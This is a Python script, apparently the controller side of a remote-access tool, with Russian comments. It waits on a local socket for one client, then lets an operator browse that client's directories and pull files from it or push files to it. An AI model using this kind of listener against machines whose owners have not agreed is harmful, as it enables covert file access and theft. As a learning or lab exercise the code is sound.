from  datetime import datetime
import json
import socket 
import base64
import struct
from typing import List
import commands
import os

cd_is_here: str = ""

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("127.0.0.1", 9990))
listener.listen(0)
print("[+] Waiting for incoming connections")
cl_socket, remote_address = listener.accept()
cd_is_here = cl_socket.recv(1024).decode()
print(f"[+] Got a connection from {remote_address} ")

                    
try:
    while True:
        try:
            print(f'Клиент тут:\n{cd_is_here}\n')
            print(f'Папка сохранения файлов с клиента тут:\n{os.getcwd()}\n')
            command :str = input(">> ")
            
            #Сдешние команды
            
            if "help" in command:
                commands.do_help_command()
                
            if "set_save_dir" in command:
                commands.do_cd(command)
                
            #Команды на забугор
                
            if "cd" in command:
                cl_socket.send(command.encode())
                cd_is_here = cl_socket.recv(1024).decode()
                
            if "listdir" in command:
                cl_socket.send(command.encode())
                print(cl_socket.recv(1024).decode())
                
            if "recv" in command:
                cl_socket.send(command.encode())
                commands.do_recieve_file(cl_socket, command, os.getcwd())
                
            if "send" in command:
                cl_socket.send(command.encode())
                commands.do_send_file(cl_socket, command)    
                
        except Exception as e:
            print(f"ошибочка вышла: {e}")
        
                
except KeyboardInterrupt:
    listener.close()
    exit()